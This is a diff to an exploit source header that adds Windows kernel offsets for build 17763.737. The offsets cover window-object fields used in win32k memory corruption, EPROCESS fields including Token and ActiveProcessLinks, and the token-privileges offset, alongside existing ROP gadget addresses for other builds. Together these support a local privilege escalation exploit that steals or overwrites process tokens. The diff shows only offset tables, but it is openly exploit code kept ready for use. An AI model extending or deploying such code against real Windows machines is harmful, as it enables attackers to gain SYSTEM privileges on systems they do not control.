@@ -4,6 +4,32 @@ namespace exploit
 {
     namespace gadget
     {
+        namespace X_17763_737
+        {
+            namespace tagWND
+            {
+                namespace tagWNDK
+                {
+                    constexpr size_t tagWNDK = 0x28;
+                    constexpr size_t HWND = 0x00;
+                    constexpr size_t KernelDesktopHeapBase = 0x08;
+                    constexpr size_t cbWndExtra = 0xC8;
+                    constexpr size_t dwExtraFlag = 0xE8;
+                    constexpr size_t pExtraByte = 0x128;
+                } // namespace tagWNDK
+            } // namespace tagWND
+
+            namespace EPROCESS
+            {
+
+                constexpr size_t UniqueProcessId = 0x1D0;
+                constexpr size_t ActiveProcessLinks = 0x1D8;
+                constexpr size_t ImageFileName = 0x338;
+                constexpr size_t Token = 0x248;
+            } // namespace EPROCESS
+            constexpr size_t _SEP_TOKEN_PRIVILEGES = 0x40;
+        }
+
         namespace X_19045_2006
         {
             constexpr size_t pop_rcx_ret = 0x20C64C;
@@ -34,7 +60,6 @@ namespace exploit
             constexpr size_t _SEP_TOKEN_PRIVILEGES = 0x40;
 
         } // namespace X_26200_4946
-
 
     } // namespace gadget
 
